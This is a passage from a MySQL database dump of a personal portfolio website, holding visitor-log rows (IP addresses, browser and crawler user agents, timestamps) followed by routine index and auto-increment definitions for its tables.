(1108, '36.89.117.227', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36', 'https://peterus.id', '2025-07-14 04:25:59', '2025-07-14 04:25:59'),
(1109, '36.89.117.227', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36', 'https://peterus.id', '2025-07-14 04:26:07', '2025-07-14 04:26:07'),
(1110, '36.89.117.227', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36', 'https://peterus.id', '2025-07-14 05:41:29', '2025-07-14 05:41:29'),
(1111, '35.204.16.32', 'Scrapy/2.12.0 (+https://scrapy.org)', 'https://peterus.id', '2025-07-14 20:36:03', '2025-07-14 20:36:03'),
(1112, '222.94.32.11', 'Mozilla/5.0 (Linux; U; Android 4.3; en-us; SM-N900T Build/JSS15J) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30', 'https://peterus.id', '2025-07-14 21:30:43', '2025-07-14 21:30:43'),
(1113, '185.177.72.30', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36', 'https://peterus.id', '2025-07-14 21:42:19', '2025-07-14 21:42:19'),
(1114, '124.221.247.200', 'Mozilla/5.0 (Linux; Android 10; LIO-AN00 Build/HUAWEILIO-AN00; wv) MicroMessenger Weixin QQ AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.62 XWEB/2692 MMWEBSDK/200901 Mobile Safari/537.36', 'https://www.peterus.id', '2025-07-15 03:20:42', '2025-07-15 03:20:42'),
(1115, '124.221.247.200', 'Mozilla/5.0 (Linux; Android 10; LIO-AN00 Build/HUAWEILIO-AN00; wv) MicroMessenger Weixin QQ AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.62 XWEB/2692 MMWEBSDK/200901 Mobile Safari/537.36', 'https://peterus.id', '2025-07-15 03:20:43', '2025-07-15 03:20:43'),
(1116, '36.89.117.227', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'https://peterus.id', '2025-07-15 05:53:54', '2025-07-15 05:53:54'),
(1117, '36.89.117.227', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0', 'https://peterus.id', '2025-07-15 06:59:40', '2025-07-15 06:59:40'),
(1118, '36.89.117.227', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'https://peterus.id', '2025-07-15 07:22:27', '2025-07-15 07:22:27'),
(1119, '36.89.117.227', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'https://peterus.id', '2025-07-15 07:22:31', '2025-07-15 07:22:31'),
(1120, '36.89.117.227', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'https://peterus.id', '2025-07-15 07:22:48', '2025-07-15 07:22:48'),
(1121, '36.89.117.227', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'https://peterus.id', '2025-07-15 07:24:15', '2025-07-15 07:24:15'),
(1122, '36.89.117.227', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'https://peterus.id', '2025-07-15 07:24:46', '2025-07-15 07:24:46'),
(1123, '36.89.117.227', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'https://peterus.id', '2025-07-15 07:29:36', '2025-07-15 07:29:36'),
(1124, '36.89.117.227', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'https://peterus.id', '2025-07-15 07:46:37', '2025-07-15 07:46:37'),
(1125, '36.89.117.227', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'https://peterus.id', '2025-07-15 07:47:25', '2025-07-15 07:47:25'),
(1126, '134.209.39.242', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36', 'https://peterus.id', '2025-07-15 07:51:58', '2025-07-15 07:51:58'),
(1127, '134.209.39.242', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36', 'https://peterus.id', '2025-07-15 07:51:59', '2025-07-15 07:51:59'),
(1128, '134.209.39.242', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36', 'https://peterus.id', '2025-07-15 07:51:59', '2025-07-15 07:51:59'),
(1129, '36.89.117.227', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0', 'https://peterus.id', '2025-07-15 07:54:03', '2025-07-15 07:54:03'),
(1130, '36.89.117.227', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0', 'https://peterus.id', '2025-07-15 07:54:18', '2025-07-15 07:54:18'),
(1131, '36.89.117.227', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0', 'https://peterus.id', '2025-07-15 07:55:31', '2025-07-15 07:55:31'),
(1132, '36.89.117.227', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0', 'https://peterus.id', '2025-07-15 08:00:27', '2025-07-15 08:00:27'),
(1133, '36.89.117.227', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Mobile Safari/537.36', 'https://peterus.id', '2025-07-15 08:02:27', '2025-07-15 08:02:27'),
(1134, '36.89.117.227', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0', 'https://peterus.id', '2025-07-15 08:17:53', '2025-07-15 08:17:53'),
(1135, '36.89.117.227', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'https://peterus.id', '2025-07-15 08:33:03', '2025-07-15 08:33:03'),
(1136, '36.89.117.227', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'https://peterus.id', '2025-07-15 08:37:05', '2025-07-15 08:37:05');
INSERT INTO `visits` (`id`, `ip_address`, `user_agent`, `url`, `created_at`, `updated_at`) VALUES
(1137, '202.133.2.42', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Mobile Safari/537.36', 'https://peterus.id', '2025-07-15 08:37:35', '2025-07-15 08:37:35'),
(1138, '36.89.117.227', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'https://peterus.id', '2025-07-15 09:16:01', '2025-07-15 09:16:01'),
(1139, '36.89.117.227', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0', 'https://peterus.id', '2025-07-15 09:22:14', '2025-07-15 09:22:14'),
(1140, '36.89.117.227', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0', 'https://peterus.id', '2025-07-15 09:32:09', '2025-07-15 09:32:09'),
(1141, '36.89.117.227', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'https://peterus.id', '2025-07-15 10:08:36', '2025-07-15 10:08:36'),
(1142, '36.89.117.227', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'https://peterus.id', '2025-07-15 10:09:49', '2025-07-15 10:09:49'),
(1143, '36.89.117.227', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'https://peterus.id', '2025-07-15 10:10:01', '2025-07-15 10:10:01'),
(1144, '36.89.117.227', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'https://peterus.id', '2025-07-15 10:10:19', '2025-07-15 10:10:19'),
(1145, '36.89.117.227', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'https://peterus.id', '2025-07-15 10:11:00', '2025-07-15 10:11:00'),
(1146, '147.185.132.189', 'Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity', 'https://www.peterus.id', '2025-07-15 10:20:12', '2025-07-15 10:20:12'),
(1147, '194.164.107.4', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36', 'https://www.peterus.id', '2025-07-15 10:38:24', '2025-07-15 10:38:24'),
(1148, '139.162.3.141', 'Mozilla/5.0 (Linux; Android 8; SM-G357FZ; Build/OPD2.190201.129) AppleWebKit/537.36 (KHTML', 'https://peterus.id', '2025-07-15 12:13:39', '2025-07-15 12:13:39'),
(1149, '139.162.3.141', NULL, 'https://peterus.id', '2025-07-15 12:14:00', '2025-07-15 12:14:00'),
(1150, '114.79.5.141', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0', 'https://peterus.id', '2025-07-15 12:57:48', '2025-07-15 12:57:48'),
(1151, '114.79.5.141', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0', 'https://peterus.id', '2025-07-15 13:17:54', '2025-07-15 13:17:54'),
(1152, '185.177.72.37', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36', 'https://peterus.id', '2025-07-15 13:54:51', '2025-07-15 13:54:51'),
(1153, '114.79.5.141', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0', 'https://peterus.id', '2025-07-15 14:01:30', '2025-07-15 14:01:30'),
(1154, '114.79.5.141', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0', 'https://peterus.id', '2025-07-15 14:02:31', '2025-07-15 14:02:31'),
(1155, '114.79.5.141', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0', 'https://peterus.id', '2025-07-15 15:00:19', '2025-07-15 15:00:19'),
(1156, '103.59.160.164', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0', 'https://peterus.id', '2025-07-15 15:00:20', '2025-07-15 15:00:20'),
(1157, '114.79.5.141', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0', 'https://peterus.id', '2025-07-15 15:04:15', '2025-07-15 15:04:15'),
(1158, '114.79.0.53', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Mobile Safari/537.36', 'https://peterus.id', '2025-07-15 15:20:15', '2025-07-15 15:20:15'),
(1159, '144.217.135.237', 'Mozilla/5.0 (compatible; Dataprovider.com)', 'https://www.peterus.id', '2025-07-15 15:43:25', '2025-07-15 15:43:25'),
(1160, '149.56.160.226', 'Mozilla/5.0 (compatible; Dataprovider.com)', 'https://www.peterus.id', '2025-07-15 15:43:52', '2025-07-15 15:43:52'),
(1161, '93.158.91.24', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36', 'https://peterus.id', '2025-07-15 23:46:17', '2025-07-15 23:46:17'),
(1162, '36.89.117.227', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'https://peterus.id', '2025-07-15 23:50:38', '2025-07-15 23:50:38'),
(1163, '36.89.117.227', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'https://peterus.id', '2025-07-16 01:17:41', '2025-07-16 01:17:41'),
(1164, '36.89.117.227', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'https://peterus.id', '2025-07-16 02:48:42', '2025-07-16 02:48:42'),
(1165, '36.89.117.227', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'https://peterus.id', '2025-07-16 04:01:32', '2025-07-16 04:01:32'),
(1166, '36.89.117.227', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0', 'https://peterus.id', '2025-07-16 04:17:29', '2025-07-16 04:17:29'),
(1167, '36.89.117.227', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0', 'https://peterus.id', '2025-07-16 04:34:33', '2025-07-16 04:34:33'),
(1168, '36.89.117.227', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0', 'https://peterus.id', '2025-07-16 04:36:31', '2025-07-16 04:36:31'),
(1169, '36.89.117.227', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0', 'https://peterus.id', '2025-07-16 04:36:38', '2025-07-16 04:36:38');

--
-- Indexes for dumped tables
--

--
-- Indexes for table `abouts`
--
ALTER TABLE `abouts`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `cache`
--
ALTER TABLE `cache`
  ADD PRIMARY KEY (`key`);

--
-- Indexes for table `cache_locks`
--
ALTER TABLE `cache_locks`
  ADD PRIMARY KEY (`key`);

--
-- Indexes for table `contacts`
--
ALTER TABLE `contacts`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `education`
--
ALTER TABLE `education`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `experiences`
--
ALTER TABLE `experiences`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `failed_jobs`
--
ALTER TABLE `failed_jobs`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `failed_jobs_uuid_unique` (`uuid`);

--
-- Indexes for table `jobs`
--
ALTER TABLE `jobs`
  ADD PRIMARY KEY (`id`),
  ADD KEY `jobs_queue_index` (`queue`);

--
-- Indexes for table `job_batches`
--
ALTER TABLE `job_batches`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `languages`
--
ALTER TABLE `languages`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `migrations`
--
ALTER TABLE `migrations`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `password_reset_tokens`
--
ALTER TABLE `password_reset_tokens`
  ADD PRIMARY KEY (`email`);

--
-- Indexes for table `projects`
--
ALTER TABLE `projects`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `sessions`
--
ALTER TABLE `sessions`
  ADD PRIMARY KEY (`id`),
  ADD KEY `sessions_user_id_index` (`user_id`),
  ADD KEY `sessions_last_activity_index` (`last_activity`);

--
-- Indexes for table `skills`
--
ALTER TABLE `skills`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `users`
--
ALTER TABLE `users`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `users_email_unique` (`email`);

--
-- Indexes for table `visits`
--
ALTER TABLE `visits`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `abouts`
--
ALTER TABLE `abouts`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT for table `contacts`
--
ALTER TABLE `contacts`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=5;

--
-- AUTO_INCREMENT for table `education`
--
ALTER TABLE `education`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=5;

--
-- AUTO_INCREMENT for table `experiences`
--
ALTER TABLE `experiences`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=4;

--
-- AUTO_INCREMENT for table `failed_jobs`
--
ALTER TABLE `failed_jobs`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `jobs`
--
ALTER TABLE `jobs`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `languages`
--
ALTER TABLE `languages`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;

--
-- AUTO_INCREMENT for table `migrations`
--
ALTER TABLE `migrations`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=13;

--
-- AUTO_INCREMENT for table `projects`
--
ALTER TABLE `projects`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=4;

--
-- AUTO_INCREMENT for table `skills`
--
ALTER TABLE `skills`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=6;

--
-- AUTO_INCREMENT for table `users`
--
ALTER TABLE `users`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT for table `visits`
--
ALTER TABLE `visits`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=1170;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
